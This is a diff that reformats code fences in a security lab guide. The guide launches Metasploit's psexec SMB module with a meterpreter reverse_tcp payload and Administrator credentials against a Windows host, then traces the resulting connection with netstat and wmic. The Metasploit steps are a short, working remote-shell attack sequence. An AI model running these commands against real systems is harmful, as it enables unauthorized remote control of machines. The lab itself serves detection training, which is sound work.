@@ -7,13 +7,13 @@ In this hands-on lab, we'll create and execute malware in a controlled environme
 ### Initial Setup
 Begin by elevating your privileges to root access:
 
-```bash
+``` bash
 
 sudo su -
 ```
 
 Launch the Metasploit Framework console:
-```bash
+``` bash
 
 msfconsole -q
 ```
@@ -24,25 +24,25 @@ Once connected, your terminal prompt will change to indicate you're in the Metas
 
 Configuring the Exploit
 Select the Windows SMB exploit module:
-```bash
+``` bash
 
 use exploit/windows/smb/psexec
 ```
 
 Configure the payload type:
-```bash
+``` bash
 
 set PAYLOAD windows/meterpreter/reverse_tcp
 ```
 
 Specify the target Windows system's IP address:
-```bash
+``` bash
 
 set RHOST (YOUR IP ADDRESS)
 ```
 
 Set the SMB credentials for authentication:
-```bash
+``` bash
 
 set SMBUSER Administrator
 set SMBPASS password1234
@@ -53,7 +53,7 @@ Security Note: Use the password you configured earlier in the lab. Ensure you're
 After configuration, your console should display all the set parameters.
 
 Execute the attack:
-```bash
+``` bash
 
 exploit
 ```
@@ -65,7 +65,7 @@ While this lab environment is simplified, two critical commands help detect atta
 
 ## Investigating the Malware Connection
 Open a Windows PowerShell window and examine all network connections:
-```powershell
+``` powershell
 
 netstat -naob
 ```
@@ -79,7 +79,7 @@ Focus on the ESTABLISHED connections, particularly the connection using port 444
 
 For additional context about connection endpoints, use:
 
-```powershell
+``` powershell
 
 netstat -f
 ```
@@ -91,7 +91,7 @@ From your earlier netstat -naob output, locate the Process ID (PID) associated w
 The output will show loaded DLLs, though in this case, you won't find much suspicious activity at this level.
 
 Dig deeper using Windows Management Instrumentation Command-line (WMIC):
-```powershell
+``` powershell
 
 wmic process where processid=[PID] get commandline
 ```
@@ -99,7 +99,7 @@ wmic process where processid=[PID] get commandline
 This reveals that the malicious file was launched directly from the command line without any parameters—a significant indicator of suspicious activity.
 
 Identify the parent process that spawned your malware:
-```powershell
+``` powershell
 
 wmic process get name,parentprocessid,processid | select-string [PID]
 ```
